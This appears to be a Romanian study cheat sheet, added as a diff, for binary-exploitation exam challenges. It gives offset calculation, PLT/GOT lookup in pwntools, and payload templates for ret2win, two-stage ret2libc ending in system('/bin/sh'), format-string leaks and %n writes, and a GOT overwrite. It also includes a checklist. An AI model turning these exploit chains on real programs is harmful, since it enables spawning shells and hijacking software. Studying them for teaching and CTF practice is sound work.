@@ -1,0 +1,73 @@
+Calcule generale, pe fiecare tip de exploit
+1. Offset-ul (valabil pentru ORICE tip de BOF, indiferent de ce pui după el)
+
+Două metode, alege una:
+
+Static, din disasamblare/Ghidra: te uiți la prolog (sub esp, N / sub rsp, N) + registrele salvate explicit (push ebx, push rbp). Offset = N (sau mărimea buffer-ului din decompilare) + 4/8 pentru fiecare registru salvat + 4/8 pentru saved ebp/rbp.
+Empiric, cu cyclic: trimiți cyclic(200), programul crapă, apoi cyclic_find(valoarea_din_$rip) (sau pattern search $rip în GEF) îți dă offset-ul direct, fără calcule manuale.
+2. PLT puts și GOT puts — cum le găsești, ce reprezintă
+
+În pwntools, NU trebuie să cauți adresele manual cu objdump:
+
+python
+elf = ELF('./binar')
+puts_plt = elf.plt['puts']   # adresa stub-ului din PLT - aici "sari" ca sa apelezi puts()
+puts_got = elf.got['puts']   # adresa din GOT - aici STĂ adresa reală din libc (sau un stub, inițial)
+PLT = o bucată de cod FIXĂ în binar (nu se mută, nu are nevoie de leak) care, la primul apel, rezolvă adresa reală din libc și o scrie în GOT.
+GOT = o zonă de date (un tabel de pointeri) care conține adresa reală. O citești ca pe orice altă valoare — de-aia puts(puts_got) îți dă efectiv “adresa reală a lui puts în libc”, ca text.
+Dacă nu ai pwntools la îndemână: objdump -R binar | grep puts îți arată GOT entry-ul (R_X86_64_JUMP_SLOT puts); objdump -d binar | grep 'puts@plt' îți arată PLT.
+3. Payload per categorie
+
+a) ret2win / ret2shellcode (fără libc)
+
+payload = b"A"*OFFSET + p64(adresa_tinta)
+
+Pe 64-bit, dacă adresa_tinta apelează ceva din libc indirect (nu funcția ta proprie), bagi un ret înainte, pt aliniere:
+
+payload = b"A"*OFFSET + p64(RET_GADGET) + p64(adresa_tinta)
+
+b) ret2libc — etapa 1 (leak)
+
+payload = b"A"*OFFSET + p64(POP_RDI) + p64(puts_got) + p64(puts_plt) + p64(adresa_de_reintrare)
+POP_RDI = gadget pop rdi; ret — pune argumentul lui puts() (adresa GOT) în registrul corect (convenția pe 64-bit, primul argument = rdi).
+adresa_de_reintrare = de obicei main, ca programul să nu moară după leak și să poți trimite al doilea payload.
+
+Calculezi baza libc:
+
+python
+leak = u64(io.recvline().strip().ljust(8, b"\x00"))
+libc.address = leak - libc.symbols['puts']
+
+c) ret2libc — etapa 2 (system(“/bin/sh”))
+
+python
+system_addr = libc.address + libc.symbols['system']
+binsh_addr  = libc.address + next(libc.search(b"/bin/sh"))
+payload = b"A"*OFFSET + p64(RET) + p64(POP_RDI) + p64(binsh_addr) + p64(system_addr)
+
+RET la început = alinierea stivei (vezi mesajul meu de aseară despre numărul par/impar de pop-uri).
+
+d) Format string LEAK
+
+payload = b"%9$p"   # sau %N$lx, N = pozitia gasita prin scanare (1,2,3... pana vezi ceva relevant)
+
+Scanezi pozițiile cu un script care testează %1$p, %2$p, ... și te uiți unde apare o adresă credibilă (stivă, libc, canary care se termină în 00).
+
+e) Format string WRITE (%n / %hn)
+
+Calculezi diferența dintre ce vrei să scrii și câte caractere ai scris deja (pad = valoare_dorita - deja_scris), apoi %{pad}c%{POZ}$hn — exact ca în runner.py, pe care l-am explicat linie cu linie.
+
+f) GOT overwrite (primitivă de scriere custom, ca la Lucky_Charm)
+
+index = (adresa_tinta - adresa_baza_array) // marime_element
+
+Rezolvi ecuația baza + index*marime = tinta.
+
+4. Ce mai ai de făcut, checklist rapid pe orice challenge nou la examen
+checksec ./binar — vezi Canary/NX/PIE/RELRO, asta îți spune direct tehnica (fără canary+fără PIE = simplu ret2win; NX=da → nu shellcode; RELRO=Partial → GOT writable).
+Deschizi în Ghidra/obiectele decompilate, găsești funcția vulnerabilă și (dacă există) win/funcția țintă.
+Găsești offset-ul (static sau cu cyclic).
+Dacă nu ai funcție țintă și ai nevoie de libc → identifici libc.rip din leak-ul de puts.
+Construiești payload-ul după tiparele de mai sus.
+Testezi LOCAL întâi (process('./binar')), abia apoi schimbi pe remote().
+Dacă ceva nu merge: deschizi cu GEF/pwndbg, pui breakpoint chiar înainte de ret, verifici cu stack/telescope că payload-ul e exact unde trebuie (vezi ghidul GEF trimis).
